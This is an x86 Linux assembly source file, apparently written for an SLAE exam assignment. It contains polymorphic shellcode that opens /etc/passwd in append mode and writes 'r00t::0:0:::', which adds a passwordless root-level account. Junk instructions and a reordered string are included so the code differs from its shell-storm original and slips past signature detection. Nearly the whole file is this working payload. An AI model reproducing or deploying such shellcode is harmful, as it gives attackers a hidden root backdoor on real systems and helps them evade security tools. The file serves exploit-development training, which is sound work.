; Filename: poly_add_user.nasm
; Author: Ray Doyle
; Website: https://www.doyler.net
;
; Purpose: SLAE Exam Assignment #6 - Polymorphic add user shellcode (Linux/x86) - 103 bytes (34 more than original)
; Original Shellcode: http://shell-storm.org/shellcode/files/shellcode-211.php

section .text

global _start

_start:

; open("/etc//passwd", O_WRONLY | O_APPEND)

   ; 0x90 - Great first instruction for this challenge
   xchg eax, eax

   pop eax  ; Line 27

   ; Unnecessary clearing of EBX
   sub ebx, ebx

   xor ecx, ecx  ; Line 3

   mov cx, 0x401  ; Line 9 - mov cx, 02001Q

   push ecx  ; Line 4

   ; We don't actually want to push ECX anymore, as it already contains 0x401
   pop edi

   ; Push the actual null bytes that we want - use the EBX we cleared earlier
   push EBX

   push 0x6  ; Line 23 - push byte 6
 
   pop eax  ; Line 2

   ; Decrement EAX to 0x5 since we POPed a 0x6 into it
   dec eax

   push 0x61702f2f  ; Line 6

   ; Extra push to break up the original string
   push 0x13371337

   push 0x64777373  ; Line 5

   push 0x6374652f  ; Line 7

   ; Added POP and PUSH isntructions to properly reorder the string
   pop EDX
   pop ESI
   pop EDI
   pop EDI
   push ESI
   push EDI
   push EDX

   mov ebx, esp  ; Line 8

   int 0x80  ; Line 10

   ; Puts original return value into EDX, then back into EAX
   push eax
   pop edx
   xchg edx, eax

   mov ebx, eax  ; Line 11


; write(ebx, "r00t::0:0:::", 12)

   push 0x5  ; Line 1 - push byte 5

   xor edx, edx  ; Line 14

   ; Unnecessary exchange to break up original lines 14 and 15
   xchg ebx, ebx

   push 0xc  ; Line 20 - push byte 12

   pop eax  ; Line 13

   pop edx  ; Line 21

   ; Swap EAX and EDX since they contain the wrong values
   xchg eax, edx

   push edx  ; Line 15

   ; NOP, separates original lines 15 and 16
   xchg eax, eax

   push 0x3a3a3a30  ; Line 16
   
   ; Extra PUSH-POP, breaks up 16 and 17
   push esi
   pop esi
   
   push 0x3a303a3a  ; Line 17
   push 0x74303072  ; Line 18

   ; Decrement EAX since we POPed an 0x5 into it
   dec eax

   mov ecx, esp  ; Line 19

   push 0x1  ; Line 26 - push byte 1

   int 0x80  ; Line 22


; close(ebx)

   push 0x4  ; Line 12 - push byte 4

   pop eax  ; Line 24

   ; Add 2 to EAX, to get 0x6 in it
   add eax, 0x2

   int 0x80  ; Line 25
   

; exit()
   ; Clear and increment EAX to get a 1 into it
   xor eax, eax
   inc eax
   
   int 0x80  ; Line 28
